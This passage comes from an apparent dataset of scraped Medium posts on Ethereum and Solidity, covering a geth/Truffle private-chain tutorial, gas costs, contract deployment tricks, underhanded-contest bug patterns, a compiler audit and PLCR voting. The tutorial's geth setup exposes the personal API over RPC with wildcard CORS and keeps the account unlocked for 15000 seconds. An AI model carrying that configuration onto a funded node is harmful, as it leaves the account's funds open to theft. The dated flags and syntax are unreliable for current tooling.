blockchain up and running, open up a new command terminal window and run the following in the \u201cprojects\u201d folder.$ geth --port 3000 --networkid 58343 --nodiscover --datadir=./blkchain --maxpeers=0  --rpc --rpcport 8543 --rpcaddr 127.0.0.1 --rpccorsdomain \"*\" --rpcapi \"eth,net,web3,personal,miner\"Explanation of the command line above:\u2014 networkid: identity of your Ethereum network for other peers to discover. You can use any random number of your choice(except the ones listed below) to create your own network and to prevent others from inadvertently connecting to your network.The following network id\u2019s are reserved for specific Ethereum networks.0: Olympic, Ethereum public pre-release testnet1: Frontier, Homestead, Metropolis, the Ethereum public main network1: Classic, the (un)forked public Ethereum Classic main network, chain ID 611: Expanse, an alternative Ethereum implementation, chain ID 22: Morden, the public Ethereum testnet, now Ethereum Classic testnet3: Ropsten, the public cross-client Ethereum testnet4: Rinkeby, the public Geth PoA testnet8: Ubiq, the public Gubiq main network with flux difficulty chain ID 842: Kovan, the public Parity PoA testnet77: Sokol, the public POA Network testnet99: Core, the public POA Network main network7762959: Musicoin, the music blockchain61717561: Aquachain, ASIC resistant chain\u2014 nodiscover: Disables the peer discovery mechanism (manual peer addition).\u2014 datadir: indicates the data directory where your blockchain will reside.\u2014 maxpeers: Maximum number of network peers (network disabled if set to 0) (default: 25)\u2014 rpc: Enable the HTTP-RPC server\u2014 rpcapi: this allows us to communicate with the Ethereum network using the web3js RPC methods in the Geth Javascript console.2. Connect to the private Ethereum blockchain using the Geth Javascript console.Open a new command terminal and navigate to the \u201cprojects\u201d folder. Run the following to launch the Geth Javascript Console,$ geth attach http://127.0.0.1:8543This will open the Geth Javascript console, that is connected to the private Ethereum blockchain network running on localhost:85433. Create an account and \u201cmine\u201d for dummy Ether.The Geth Javascript console, provides web3js api\u2019s to create a new account. Use the following Geth commands to create a new account and unlock it.> personal.newAccount('seed')> personal.unlockAccount(web3.eth.coinbase, \"seed\", 15000)You can now start mining dummy \u201cether\u201d using miner.start()> miner.start()In your \u201cGeth network terminal window\u201d, you will now see \u201cether\u201d being mined.Screenshot of the Geth Terminal window running the Private Ethereum Network (Dummy Ether being mined)To check your \u201cether\u201d balance, use the following command in the Geth Console.web3.fromWei(eth.getBalance(eth.coinbase), \"ether\")And to stop mining use,miner.stop()Screenshot of Terminal running the Geth Javascript console.Step 4: Create a \u201cHello World\u201d Smart Contract in Solidity, and deploy it to the private Ethereum Blockchain1.Initialize TruffleCreate a new folder in the \u201cprojects\u201d directory to initialize truffle$ mkdir truffle$ cd truffle$ truffle init  //this will initialize truffle and create the necessary files and folders in the directoryScreenshot of creating truffle folder and truffle init2. Create a Smart Contract. Go to the \u201ccontracts\u201d folder in the \u201ctruffle\u201d directory, and create a new file called \u201cHello.sol\u201d. You can create this file in Visual Studio, and cut paste the following code.pragma solidity ^0.4.15;contract Hello {   string public message;   function Hello() {   message = \"Hello, World : This is a Solidity Smart Contract on the Private Ethereum Blockchain \";   }}This is the smart contract written in Solidity. Notice that the Solidity smart contract code is very similiar in form to Javascript.3. Configure the Truffle migrations folder to deploy the Solidity code. Go to the \u201cmigrations\u201d folder in the \u201ctruffle\u201d folder, and create a new file called 2_deploy_contracts.js, with the following code.var Hello = artifacts.require(\"./Hello.sol\");module.exports = function(deployer) {   deployer.deploy(Hello);};Notice that the above code is Nodejs.4. Update the truffle task runner with your account and network details. Update \u201ctruffle.js\u201d with the following code.module.exports = {rpc: {host:\"localhost\",port:8543},networks: {development: {host: \"localhost\", //our network is running on localhostport: 8543, // port where your blockchain is runningnetwork_id: \"*\",from: \"0x09fcc6a75c059265fbaf2d60476794f6f9813652\", // use the account-id generated during the setup processgas: 20000000}}};Note that the \u201cfrom\u201d field should contain your account id, which was create in the Geth Javascript console when you ran \u201cpersonal.newAccount(\u2018seed phrase\u2019). In order to get this again you can use the following command in the Geth Javascript console.> personal.listAccounts[0]5. Compile the smart contract in Truffle, and deploy it to the private blockchain$ truffle compile$ truffle migrateScreenshot of truffle compileScreenshot of truffle migrateTroubleshooting:Ensure that you are in the \u201ctruffle\u201d folder to run the commands above.The deployment of the smart contract to the blockchain may take a few seconds. Ensure that you are mining blocks at the time of smart contract deployment, so that the bytecode is added to the newly mined block of the blockchain. In case you stopped mining before, you can restart mining using the following command in the Geth Javascript console.> miner.start()Step 5: Execute the Smart contract on the private Ethereum blockchainIn this step we will execute our \u201cHello World\u201d smart contract on the blockchain using the Truffle console.Open a new Terminal window and navigate to the \u201ctruffle\u201d folder. To launch Truffle console from the terminal shell,$ truffle consoleWithin the truffle console, run the following commands> var dApp> Hello.deployed().then(function(instance) { dApp = instance; })> dApp.message.call()You should see the following result,Screenshot of Truffle Console running the Solidity Smart Contract on the Private BlockchainYay!!! You have now successfully created your very first private Ethereum blockchain and run your very first Solidity code on the Blockchain!We covered a lot in this tutorial and following is a summary of all the steps.Found this post useful? Hit the \ud83d\udc4f button below to show how much you liked it :)Follow me on Medium for the latest posts on Blockchain!Read Next:Making sense of the Blockchain Landscape in 2018Other Articles by Prashant Ram:BlockChain Demystified: Looking Under the hood of the BlockChainUnderstanding Digital Signatures in Blockchain and CryptocurrencyThe Distributed Autonomous Organization (DAO) and how Blockchain/AI can take over the network \u2014 and why you cannot stop it!Happy Coding!Next Steps:In the upcoming part 2 we will examine how to quickly setup a private Ethereum blockchain on the Microsoft Azure cloud and deploy a smart contract. We will also examine the Remix IDE.References:www.ethereum.org/clihttps://medium.com/@s4saif.121/demystifying-ethereum-private-blockchain-74f78ddf76fbhttps://hackernoon.com/heres-how-i-built-a-private-blockchain-network-and-you-can-too-62ca7db556c0https://www.devteam.space/blog/private-blockchain-implementation-guide/", "responses": 7, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Private Blockchain"]}, {"title": "Public vs External Functions in Solidity", "post_link": "https://medium.com/@gus_tavo_guim/public-vs-external-functions-in-solidity-b46bcf0ba3ac?source=search_post", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-07-29", "last_modified_date": "2018-06-19", "readtime": "0.92", "claps": 415, "voters": 67, "content": "Public vs External Functions in SolidityGustavo (Gus) GuimaraesFollowJul 29, 2017 \u00b7 1 min readI have been going through functions in smart contracts code I am creating and decided to make it more explicit s per this best practice .I noticed that I hesitated whenever I was about to add either the public or external visibility mark. This came from a place of uncertainty as to which is better to use when exposing the smart contract functions to outside calls. I came across this excellent answer on StackOverflow.In a nutshell, public and external differs in terms of gas usage. The former use more than the latter when used with large arrays of data. This is due to the fact that Solidity copies arguments to memory on a public function while external read from calldata which a cheaper than memory allocation. I went on to the yellow paper to refresh my memory about call data opcodes.public functions are called internally and externally. internal calls are executed via jumps in the code because array arguments are passed internally by pointers to memory. When the compiler generates the code for an internal function, that function expects its arguments to be located in memory. That is why public functions are allocated to memory. The optimization that happens with external is that is does not care for the internal calls.So if you know the function you create only allows for external calls, go for it. It provides performance benefits and you will save on gas.", "responses": 2, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Public Functions", "External Functions"]}, {"title": "Advanced Solidity code deployment techniques", "post_link": "https://medium.com/aragondec/advanced-solidity-code-deployment-techniques-dc032665f434?source=search_post", "author_name": "Jorge Izquierdo", "author_link": "https://medium.com/@izqui9", "publish_date": "2017-03-15", "last_modified_date": "2018-06-13", "readtime": "5.09", "claps": 363, "voters": 67, "content": "Advanced Solidity code deployment techniquesJorge IzquierdoFollowMar 15, 2017 \u00b7 6 min readThis is a continuation post to the work we did with Zeppelin for the article on Proxy libraries for code upgradeability. Reading that post is not required in order to understand this one, but it is definitely a recommended read, as the ideas are pretty much on the same line. And towards the end we will combine them.This post is a collection of small ideas that were each of them too small to be a separate post but were also out of the scope of the previous post.Some credits are due to Martin Holst Swende whose posts he wrote around September 2015 I have been encountering all the time while working on this. Especially this post on Ethereum quirks and vulns.An important disclaimer is that these practices can be risky if they are not used with maximum care and attention and their implementation is a prototype and hasn\u2019t been audited. Please don\u2019t copy and paste any of the code below without fully understanding it. They bring a lot of dynamism, but this dynamism comes at a price, in this case security.The three techniques are:Dynamic contract factories.Counterfactual contract deployment.Arbitrary code execution on deployed contracts.After that I will try to make the case for how combining these three ideas on top of dynamically linked libraries, can make for a great future-proof system.Dynamic contract factoriesLet\u2019s state this clear, \u2018traditional\u2019 contract factories are a pain in the ass. The moment you do new Contract(...) anywhere in your Solidity code, that contract\u2019s bytecode will automatically be appended at the end of the main contract bytecode. The problem with this is that factories get pretty fast very expensive in gas terms, as you will be paying for deploying the factory and all its childs in the same transaction, which can make it go over the gas limit.The other downside of this, is that this bytecode is not modifiable in any way by the contract. There is another way of deploying contracts from Solidity without needing to do new and that is by calling the create opcode directly and providing it with a dynamic byte array.In order to deploy a contract this way, you would call the deployCode function with the bytecode of the contract to deploy as argument (the input data of a contract deploy transaction).A live example of this in the Kovan testnet can be found here.With this working, you can think of more involved mechanisms to get the byte array there. It is trivial to create \u2018code registries\u2019 that are basically dynamic factories. In this example anyone can deploy code under a identifier, and only this address can update the code when she wants.And here you can see the two example transactions in Kovan: first the uploading of the code and here the deployment of the code with its identifier.Counterfactual contract deploymentUPDATE: Most of this will be invalid after EIP 86 (scheduled for Metropolis)Now that we have the ability for a contract to deploy code that could have been unknown when it was deployed, an interesting point is knowing what the addresses of these contracts will be before hand.The fact that we can deterministically know what address a not-yet-deployed contract will have can allow for prefunding a contract before its existance or hardcoding its address even though it has not been developed yet.In Ethereum contracts are always deployed in an address that is a funcion of that account\u2019s address and its nonce:contractAddress = sha3(rlp_encode([address, nonce]))[14:]Basically, the last 20 bytes of the sha3 of the list composed by the adderess and the nonce RLP encoded.For a private-key based account, the nonce has to be incremented every time a transaction is sent from that account. In the case of the contract, it is only incremented when it does a create operation, that it is, every time the contract creates another contract. The Solidity function for determining all the contract addresses that contract will deploy could be something like this:Note: this function will only apply for the first 127 contracts created by the contract. In order to really scale this method, a proper RLP encode implementation would be needed.For example, from nonce 128 to 257 it would be:address(sha3(0xd7, 0x94, address(this), 0x81, nonce))On deployment it will send whatever value it was deployed with to the address its first contract will be deployed at. We can see that Etherscan labels it as an address first. The moment we execute deployCode it is converted into a contract and this contract can managed its previously allocated funds.You can see the example deployed to Kovan here.Arbitrary code execution on deployed contractsA bit unrelated from this two last ideas is allowing for arbitrary code execution on already deployed contracts.Using a similar flow as with proxy libraries, if we perform a delegatecall from the contract to an arbitrary one, this one will be able to change the contract storage.We will start defining a Fixeable base class that contracts that want to be fixed need to inherit from:Contracts define under what circumstances they will be able to execute code, here you can imagine all the complexity and governance you are comfortable with, but let\u2019s keep it simple for this example:And now for the Fixer contract, which inherits from BrokenContract so they have the same storage and it can easily modify it:With everything in place, I wrote a simple test in Javascript to demonstrate the expected behavior:This is the transaction on Kovan that executes the code and fixes the contract.Putting it all togetherLet\u2019s combine the tricks exposed above plus proxy libraries together in a real hypothetic (or not) case.Imagine you had a pretty bad bug in your token code, that could cause all balances to be wiped out. You could update the logic for the function that was broken by deploying a new library and then linking your contract to this new logic in the Dispatcher.All the balances are wiped out because of this attack, but thanks to the arbitrary code execution feature you could code a contract (or set of contracts) that will reset the balances to their values before the attack.We have now fixed the bug and reset it to the proper balances without changing the main contract.ConclusionThese three techniques, plus the idea of proxy libraries \u2014 where all bug prone and business logic lives \u2014 can make for a pretty dynamic environment for deploying future safe smart contracts.We need to assume there will be dumb entities (exchanges or IoT devices for example) that will have the address of a given contract hardcoded and changing it might be too burdensome. While ENS could help with this, there will be entities that will keep relying on non upgradeable addresses.This dynamism is very important for Aragon, where we intend to deploy contracts that could be there for decades.Does this kind of work sound fun? We are looking for people to expand our technical team and help us with this cool stuff. We are hiring, join us!", "responses": 3, "tags": ["Ethereum", "Blockchain", "Solidity", "Dapps", "Development"]}, {"title": "Lessons Learnt from the Underhanded Solidity Contest", "post_link": "https://medium.com/@chriseth/lessons-learnt-from-the-underhanded-solidity-contest-8388960e09b1?source=search_post", "author_name": "Christian", "author_link": "https://medium.com/@chriseth", "publish_date": "2017-09-22", "last_modified_date": "2018-05-11", "readtime": "4.51", "claps": 562, "voters": 61, "content": "Lessons Learnt from the Underhanded Solidity ContestChristianFollowSep 22, 2017 \u00b7 5 min readUnderhanded coding contests are a good way to highlight shortcomings of a programming language. Solidity has a big advantage here over languages like C, because it can still be changed to some degree without breaking too many tools and programs. Because of that, in reaction to the Underhanded Solidity Contest (results) I would like to provide an analysis of some of the submissions and explain how we changed the language (or plan to change it) or at least explain which compiler warnings we introduced.ShadowingMany of the submission exploited the fact that it was possible to shadow built-ins like now or msg. We already added warnings in such situations shortly before the beginning of the contest. The solution is not yet complete, because there are still some ways to confuse users by shadowing/overloading using inheritance, but we are also working on that.Bypassing Ether AccountingAnother very common theme was to use the fact that it is possible to send Ether to a contract without triggering the fallback function, and thus bypassing any internal accounting that might be done there.Three example submissions that exploit this are the one by Jo\u00e3o Carvalho (won third prize), Richard Moore (won second prize) and Christoph Jentzsch (a very short example). This is a quite tricky problem to tackle by means of the language, because sending Ether without executing the receiving contract cannot be prevented without serious changes to the Ethereum protocol. We could introduce a \u201cmagic storage variable\u201d that automatically tracks Ether sent via regular means, but that would be quite expensive and because of that would also make it impossible for a contract to receive Ether within the fallback function gas stipend. Another measure would be to warn about this issue whenever this.balance is used outside of the context of a mere x.transfer(this.balance) , but it would probably have a quite high false positive rate. This problem has been part of the Security Considerations section of the Solidity documentation for a long time, and at the moment, this is the best \u201csolution\u201d we could come up with.Gigantic ArraysA different problem is exploited in the submission by Doug (honorable mention). It allows overwriting objects in storage by generating a gigantic array.The following two problems lead to the attack:The length member of storage arrays can be assigned arbitrarily.Gigantic storage arrays (as opposed to mappings) overlap predictively.Since changing the storage layout would be a quite drastic change which would probably also make it necessary to add version information to libraries, it is better to fix point 1.With the introduction of the SMT-based overflow checker, the underflow used in the exploit would be noticed at compile-time and it would be required to change the code fromtoto silence the warning and thus also make the exploit impossible.The introduction of a pop method, as suggested in the code, would of course also help.This still does not solve situations where you use something like x.length = 2**200 directly. While Solidity currently warns you about such large arrays if they are static, it does not do so for dynamic arrays. Here, the SMT solver might come to a rescue and require that such assignments to length are either \u201csmall\u201d or they are done using x.length += a or x.length -= a for a \u201csmall\u201d a .Overflows in the ABI DecoderThe winning entry by Martin Swende exploited an overflow in the ABI decoder. The attacker would craft a special transaction payload such that the length property of an array is gigantic while the data used is comparatively small. The second fact is required because the transaction would require too much gas otherwise. This is made possible because the ABI decoder routine that computes the number of bytes from the array length (size_in_bytes = number_of_elements * 32) overflows. Still, it is quite hard to exploit this and the smart contract does it by using the explicit length member in one part of the code and another length that was computed manually from the size of the calldata in another part of the code. The resulting code looks a little weird as expected.Since the bug is hard to exploit and we are working on a re-implementation of the ABI encoder and decoder in the new intermediate language iulia anyway, we decided to only put safety measures into the new decoder. Apart from avoiding such overflows, the new decoder also checks that it never reads beyond the supplied data length (which is actually fine because it is specified to be filled with zeros, but indicates an invalid input encoding).MiscellaneousThe submission by glockenspieleth relies on type deduction rules which might be counter-intuitive at first, especially in the well-known snippet for (var i = 0; i < x.length; x++) , but this case has been warned about in the compiler for quite some time now.A submission by andrejcvoro exploited another bug in a for loop:for (uint i = 4; i >= 0; i--) { ... }This loop will not terminate because i >= 0 is always true. Such cases will be detected by the SMT solver in the future.The contract by blockie exploits the unary plus infamous due to a bug in the hacker gold token contract. The compiler warns about this for quite some time and it will be fully removed in the next breaking release.Marco Giglio exploits homoglyphs (different characters that look similar or identical) in string literals. We currently do not plan any countermeasure against this since there is very little use for string literals in Solidity (as opposed to e.g. JavaScript). The fact that the contract uses string literals and not type-safe structs is hopefully suspicious enough. If you think otherwise, please get in touch.Uninitialized storage pointers are exploited by sammayo, which leads to unintended overwrites in storage. The compiler has a warning for the usual cases for a long time, and we are working to catch the remaining special cases. It now also requires an explicit storage keyword for storage pointers.The submission by Zachary Williamson uses \u2014 among other things \u2014 the fact that due to the way the EVM is built, the contract cannot call itself at the point of its construction. A warning about the most common case has been added some months ago and the static analyzer in remix already warns about that for even longer.Get in TouchIf you found a bug in the code generation part of Solidity, please report it to the Ethereum Foundation\u2019s bug bounty program. Please avoid prior public disclosure in order to be eligible for a reward.For not so serious issues, please open an issue in our issue tracker or talk to us on gitter.im/ethereum/solidity-dev.If you want to implement security measures, please also either talk to us or (for smaller things) just open a pull request. If you want to make a long-term commitment to developing Solidity and would like to be paid for that, please consider applying for a job at solidity-jobs@ethereum.org.", "responses": 1, "tags": ["Ethereum", "Solidity", "Security", "Language", "Exploit"]}, {"title": "Solidity Compiler Audit Report", "post_link": "https://medium.com/@AugurProject/solidity-compiler-audit-report-1832cedb50a8?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-12-11", "last_modified_date": "2018-05-27", "readtime": "2.03", "claps": 470, "voters": 62, "content": "Solidity Compiler Audit ReportAugurFollowDec 11, 2017 \u00b7 3 min readIn September 2017, Augur engaged Coinspect to perform a security audit of the Solidity Compiler. The objective of the audit was to evaluate the security of the compiler. Sergio Lerner lead the audit, and has delivered a thorough report of the codebase.The full report can be found here, and summary of the audit and issues can be found next.AssessmentDuring the assessment, Coinspect identified 0 high-risk issues, 0 medium-risk issues, and 10 low-risk issues. The issues identified during the assessment do not lead to the compilation of vulnerable code. Some of the low-risk issues were communicated to the Solidity team and fixed in newer releases, while some other issues remain unfixed.Development teams of products which one or more of these issues may effect were notified on Friday, December 8th, 2017.The audited project can be found in the ethereum/solidity Github repository.IntroductionA white box security audit was conducted on the Solidity Compiler in order to detect detect compiler flaws that can result in:Reduction of the security of the deployed contracts.Result in non-deterministic behavior.Malicious code execution or crashes when parsing specially crafted Solidity source code.Resource exhaustion during compilation, either CPU, memory or disk.Compiled code that consumes a non-constant amount of gas (e.g. depending on arguments), where the programmer would have expected constant cost.Facilitating underhanded code (trojans in open code).Also common application security vulnerabilities were searched, including:Input validation.Denial of service prevention.Brute-forcing prevention.Information disclosure.Memory corruption vulnerabilities: buffer overflows, user supplied format strings.Integer overflows.Pointer management vulnerabilities: Double-free, use-after-free.The audit was completed on October 2017, but the the report was completed on November 2017. This reports includes all the results from the audit.Findings [LOW]SOL-001 \u2014 O(n2) compiler output blow-up by forced warnings/errors.SOL-002 \u2014 O(n3) compiler output blow-up by function name duplicates.SOL-003\u2014 RAM blow-up by constants cycles.SOL-004 \u2014 RAM blow-up by exponential steps in constant cycle findings.SOL-005 \u2014 Unbounded gas cost when deleting dynamically sized arrays.SOL-006 \u2014 Duplicated super-constructor calls not reported.SOL-007 \u2014 Error-prone Multi-Assignment with empty LValues.SOL-008 \u2014 CPU blow-up using huge bignums literals.SOL-009 \u2014 Output messages size blow-up using huge bignums literals.SOL-010 \u2014 Easy underhanded code using false overrides.Full ReportThe full audit report can be seen here: Solidity Compiler Audit Report.Please reach out to team@augur.net with any questions, or join the #dev chat in our Discord channel.", "responses": 1, "tags": ["Ethereum", "Bitcoin", "Augur", "Prediction Markets", "Blockchain"]}, {"title": "Dev Diary I: A Walkthrough of PLCR Voting in Solidity", "post_link": "https://medium.com/metax-publication/a-walkthrough-of-plcr-voting-in-solidity-92420bd5b87c?source=search_post", "author_name": "adChain", "author_link": "https://medium.com/@AdChain", "publish_date": "2017-09-05", "last_modified_date": "2018-06-13", "readtime": "9.92", "claps": 695, "voters": 55, "content": "Dev Diary I: A Walkthrough of PLCR Voting in SolidityadChainFollowSep 5, 2017 \u00b7 10 min readThis is the first entry in a series of regular dev diaries members of the adChain Registry dev team will be publishing over the coming months. This first entry is about the adChain Registry\u2019s partial-lock commit/reveal voting system, and was written by Mike Goldin of ConsenSys.Voting on whether to admit domains to the adChain Registry is the heart of adChain\u2019s incentive game. To support this we have developed and open-sourced a generic, Apache-2 licensed implementation of partial-lock commit/reveal (PLCR) voting, written in Solidity. PLCR voting is an efficient system for token-weighted voting which enables a user to participate in multiple polls simultaneously with their tokens while preventing the double-voting of tokens within polls. Importantly, it allows users to withdraw at any time the maximum number of tokens not being actively used for voting.PLCR voting was originally described in a blog post by Aron Fischer writing for the Colony project. Elena Dimitrova\u2019s blog posts on the topic were referenced heavily in building this implementation. We are grateful to them for their original work!Why PLCR Voting?Implementing PLCR voting in Solidity is not trivial, so why bother? In addition to obscuring vote tallies prior to poll completion using commit/reveal (which is desirable to prevent the voting process itself from influencing vote results) PLCR voting enables two things:It enables a user to participate in multiple polls simultaneously while preventing the double-voting of tokens within polls.It allows users to withdraw at any time the maximum number of tokens not being actively used for voting.As an illustration: a user loads 10 tokens into the PLCR Voting contract. The user then commits 10 tokens in poll A and six tokens in poll B. After revealing in poll A, six tokens remain locked in poll B but the user can withdraw four tokens.In a naive non-PLCR polling system, a user might lock tokens in a smart contract describing a single poll. This is not an ideal solution because it prevents the user from participating in multiple polls simultaneously with the same tokens. If the user\u2019s tokens are locked in some smart contract, another smart contract cannot `transferFrom` the user to lock them itself.Remediating this and using one smart contract to manage multiple polls need not be super complex if the contract can lock all user tokens while the user has tokens committed in any polls. However, if the user has approved such a contract to lock 10 tokens and less than 10 are actually committed to polls at any point, the user has to wait for all the polls to conclude before withdrawing any of their tokens. This could actually discourage users from participating in voting, as it ties their hands should they have tokens committed to polls while market events are occurring they might like to respond to. Polling systems should maximize token liquidity to the extent possible.Maximizing token liquidity as such requires the developer take on a fair bit of complexity, at least in Solidity. Using MiniMe tokens is one approach. PLCR voting supports tokens which are not MiniMe tokens.PLCRVoting.solA deployed instance of PLCRVoting.sol specifies a token for which voting rights may be apportioned. Any token-weighted votes needing to be made using that token can be made using the same deployed PLCR voting contract, and these polls will not interfere with one another. The token to be used is specified as the only argument to the constructor.Creating a pollThe startPoll function is used for creating new polls. It takes three arguments and returns a uint. The arguments are:voteQuorum: the necessary percentage of votes \u201cfor\u201d necessary for a poll to be considered passing. Some poll topics may require a supermajority to pass, for example.commitDuration: the duration of the commit period, in seconds.revealDuration: the duration of the reveal period, in seconds.In the function body, the first thing we do is increment the contract\u2019s pollNonce, a storage variable. By incrementing it every time a poll is started, we create a unique ID for each poll. Because we always increment the pollNonce first, note that there will never be a poll with ID zero.Next we instantiate a Poll struct and add it to the pollMap using the pollNonce as the key. The Poll struct stores the poll parameters which were passed in as arguments and initializes counts of votes for and against to zero.Finally we fire a PollCreated event with the pollNonce, and return the pollNonce to be used later as this poll\u2019s pollID. Pretty simple!The next logical thing which might happen after a poll is created, is that someone might like to vote in that poll. There are a few steps to this process, which begin with requestVotingRights.Requesting voting rightsTo prevent tokens double-voting within a poll, the PLCR contract needs to manage user tokens from the time they are committed to when they are revealed. Managed tokens can be used to vote in multiple polls concurrently, but not multiple times in the same poll. requestVotingRights function bestows voting rights to the user equal to the weight of the tokens put under management.In the first line of the function body we check that the actual token balance of the message sender is sufficient relative to the numTokens argument provided. The following line calls transferFrom, moving numTokens from the balance of the message sender to the balance of the PLCR contract. The first line is a redundant check: the second require statement would throw an error in any case where the first did. This is just defensive programming, since people may use this contract with buggy ERC-20 implementations (though there is no excuse for doing so when good implementations exist).Notice also that transferFrom will fail if the user did not approve the PLCR contract to transfer numTokens prior to calling requestVotingRights. This is sad and there are proposals to improve upon the \u201capprove and call\u201d pattern, but they are not yet widely implemented.Finally, if the first two lines succeed, we increment the voteTokenBalance of the message sender by numTokens. Whew. We can vote now. We could also withdraw everything now, as none of the tokens managed have yet been locked in a poll.Committing a voteCommit-reveal is a pattern used in ENS to conceal bids, and can be used for secret balloting as well. A committed vote is a salted hash of the user\u2019s vote, meaning the user\u2019s preference (yes or no) is concatenated with some randomness (the salt) before being hashed and committed. commitVote takes the following arguments:pollID: The ID of the poll being voted in (originally returned in some invocation of startPoll)secretHash: The keccak256 hash of the voter\u2019s choice and salt (tightly packed and in-order)numTokens: the number of tokens to commit to the poll for this voteprevPollID: the ID of the poll for which the user currently has the greatest number of tokens less than or equal to numTokens committed (we\u2019ll talk about this one later).Okay, lets look at the function body. The first thing we\u2019re going to do are a few checks. We\u2019ll call a helper function to make sure the commit period for the provided pollID is active, that the voteTokenBalance of the message sender is at least the numTokens value passed in, and that the provided pollID is not zero.Digression: why do we treat the poll for pollID zero specially? We noted earlier that in startPoll there will never be a pollID for pollNonce zero, and here we specifically check that votes are not being committed to the poll at pollID zero. In the EVM, all data is initialized to zero. If you declare a uint x and don\u2019t initialize it, (x == 0 && x == false) will be true. For smart contracts that interface with the PLCR voting contract, it may be useful to reference the poll at ID zero as a sort of null value. In the adChain Registry, for example, pollIDs are stored with listings which have been challenged. By default these will be initialized to zero. It is efficient if we can know that a listing with pollID zero has no active challenge rather than having to store a separate boolean. For this reason we want to keep the poll at index 0 unused.Okay, so we finished our checks. Now we\u2019re going to do something funky and introduce our doubly linked list.The Doubly Linked-ListThe PLCRVoting contract uses doubly-linked lists to keep track of which polls users have tokens committed in. Implementing a doubly-linked list is a freshman year homework assignment for computer science majors, but implementing one in Solidity is rather more challenging than doing so in, say, Python, because Solidity is such a low-level language. The doubly-linked list is what lets us efficiently release the maximum number of tokens possible to users who wish to withdraw their voting rights and have tokens committed in multiple polls less than the total tokens they have voting rights for.First, a meditation on a core concept: mappings can be used to address memory directly in Solidity, like pointers in C. This is the key to building complex data structures in Solidity.In PLCR voting there is one doubly-linked list per user, addressed using the msg.sender address of the user. A node in a user DLL corresponds to a pollID. The DLLs are always sorted by the number of tokens committed by the user for the polls corresponding to the nodes. Data is stored separately from the nodes themselves and is addressed using the hashed concatenation of a user address and a node ID to index into a string-keyed mapping of integers called an AttributeStore.To clarify: a user address addresses a specific DLL. A nodeID addresses a specific node in a DLL, but because nodeIDs correspond to pollIDs, multiple DLLs can have nodes with identical nodeIDs. By concatenating a user address with a nodeID and hashing, we get a unique location in memory where we can look to find data. The reason we store the data separately from the nodes is so we only need to store one mapping for all nodes, as opposed to one mapping per node. The declaration of a mapping, even if the mapping is empty, uses storage.That\u2019s the basic overview of how the DLL works. Lets get back to how commitVote works and see how we use the DLL in practice.Committing a vote, continuedOn line 102 we set a uint called nextPollID to the result of a method getNext, which is a method of msg.sender\u2019s DLL, that takes an argument prevPollID. prevPollID is the ID of the node which will be the previous node of the new node we are inserting. nextPollID then will be the next node of the new node we are inserting, since it\u2019ll go after prevPollID and therefore before nextPollID.Why do we make the user provide the prevPollID value? We could search through the list to find the correct prevPollID, but in very long lists we might bust the gas limit doing so. Better to let the user do that off-chain in a call and then provide it so the transaction can run in constant time.Line 104 checks, in constant time, whether the provided prevPollID was valid given the number of tokens being committed in the new poll. It should not be possible for the list to become unsorted. If the check passes, on line 105 we insert the new node!We\u2019ve inserted a node, but notice we haven\u2019t actually added the data yet. On line 107 we\u2019ll use a helper function attrUUID to create a new universally unique ID which is the sha3 hash of the user address and the nodeID. Finally we store the number of tokens committed for the poll and the secretHash of our vote.Wow, that was hard!Revealing a voteNow that we know how committing works, revealing will actually be relatively easy. We\u2019ve learned all the hard stuff at this point, so let\u2019s take a gander at revealVote! revealVote takes three arguments:pollID: the pollID of the poll being revealed for.voteOption: the user\u2019s choice in the poll. 1 is a vote for, 0 is a vote against.salt: the random number concatenated to voteOption to produce the secretHash from commitVote.You\u2019ve been around the block at this point, so you know what we\u2019ll do first: checks. We\u2019ll check that the reveal period for the provided pollID is active, that the user has not already revealed for this poll, and we\u2019ll make sure the provided vote option and salt actually match the secretHash which was committed by computing the sha3 hash of the two items and comparing the result to the secretHash stored in the user\u2019s DLL.On line 140 we\u2019ll get the number of tokens the user committed for this poll. Then depending on what the user\u2019s choice in the poll was, we\u2019ll update the poll\u2019s global votesFor or votesAgainst tally.Finally on line 147 we\u2019ll remove the node for this poll in the user\u2019s DLL.Wow, that was easy!Who won?Okay, so a poll\u2019s reveal period has concluded and we want to know how it went. This one\u2019s pretty simple. The isPassed function takes a pollID as an argument and returns true if the number of votes for satisfied the quorum requirement relative to the votes against. In a tie the poll is not passed. Note that the quorum requirement is not a quorum of total tokens which must vote, it is only a quorum of the tokens which did vote.Taking our tokens outThis is the part we\u2019ve worked so hard for. Lets say we have voting rights for 10 tokens, but only seven of them are currently committed in polls. Using withdrawVotingRights we should be able to get three out. withdrawVotingRights takes as an argument the number of tokens we wish to withdraw.The magic happens on line 69. We calculate the tokens available to withdraw by subtracting from the user\u2019s voteTokenBalance the result of a helper function getLockedTokens taking the user address as an argument. This wraps another helper function getNumTokens which takes as arguments our user address and result of yet another helper function getLastNode.Now think about this: our DLL is always sorted by the number of tokens committed to a poll. getLastNode indexes to node zero (the root node) for the DLL of the user and gets the previous node, which should be the poll for which the user has the greatest number of tokens locked. Just by subtracting that number from the total number of tokens the user has loaded in the PLCR contract, we know how many they can withdraw.All of the hard work we did with the DLL, we did for that.Back in withdrawVotingRights, it\u2019s all bookkeeping: we send the tokens back to the user and decrement their voteTokenBalance.And that\u2019s it!Hopefully this walkthrough has been helpful for your understanding of how our PLCR voting contract works! Feel free to use it yourself for all your token-voting needs!Massive props to ConsenSys 2017 interns Yorke Rhodes, Cem Ozer and Aspyn Palatnick for working so hard this summer to make the PLCR voting dream a reality.", "responses": 1, "tags": ["Ethereum", "Adchain", "Blockchain", "Solidity", "Adchain Dev Updates"]}, {"title": "Writing Smart Contracts with Solidity 0.5 and Above", "post_link": "https://medium.com/block-journal/writing-solidity-0-5-smart-contracts-101-5efd1ee9f53e?source=search_post", "author_name": "Ross Bulat", "author_link": "https://medium.com/@rossbulat", "publish_date": "2019-02-02", "last_modified_date": "2019-05-30", "readtime": "11.6", "claps": 422, "voters": 56, "content": "Writing Smart Contracts with Solidity 0.5 and AboveA walkthrough to start writing Ethereum smart contracts with Solidity 0.5 and aboveRoss BulatFollowFeb 2 \u00b7 12 min readStart writing smart contracts with Solidity > 0.5This article acts as an on-boarding tool for you to start writing smart contracts with Solidity. By using standard tools and conventions that the developer community have been evolving since the language\u2019s inception, we will visit the recent changes to Solidity and how to ensure your smart contracts are error free.The official Solidity 